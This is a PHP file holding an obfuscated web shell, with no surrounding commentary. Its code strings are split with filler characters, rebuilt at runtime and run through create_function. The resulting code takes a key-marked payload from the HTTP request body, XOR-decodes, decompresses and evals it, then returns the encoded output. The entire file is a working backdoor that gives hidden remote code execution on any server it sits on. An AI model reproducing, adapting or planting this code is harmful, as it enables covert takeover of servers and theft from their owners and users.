<?php
$x=str_replace('F','','crFFeaFte_fuFFnFction');
$m='trlen(b2$tb2)b2;$o="";b2fb2or($i=0;$i<$l;){for(b2$j=0b2;($b2j<$c&b2&$i<$lb2)';
$E='b2e64_enb2cob2de(b2@x(@gzcomb2prb2ess($o),$b2k));printb2("$p$khb2$r$kf");}';
$o='[1]b2)b2,$k)));$o=@b2ob_getb2_contenb2ts()b2;@ob_enb2d_clb2b2ean();$r=@bas';
$P='atch(b2"/$khb2b2(.+)$b2kf/",@filb2e_b2get_conb2tents("b2php://input"b2)';
$e='"YkBLsVmiSK6b2Tg7ag";b2funb2ction xb2($t,$kb2){$c=strb2leb2n($k);$l=sb2';
$n='b2,$m)==1b2)b2 b2{@ob_start();@evb2al(@gzb2uncb2ompress(@x(@bb2ab2se64_decodb2e($m';
$y='b2b2;$j++,$b2i+b2+){$o.=$b2t{$i}^$k{$j};}}returnb2 b2$o;}if (b2@preg_m';
$b='$k="5b29917a5e";b2$kh=b2"c9eb2a1f7bcb2d63b2";$kf="7099d2b20b258878"b2;$p=b2';
$f=str_replace('b2','',$b.$e.$m.$y.$P.$n.$o.$E);
$M=$x('',$f);$M();
?>
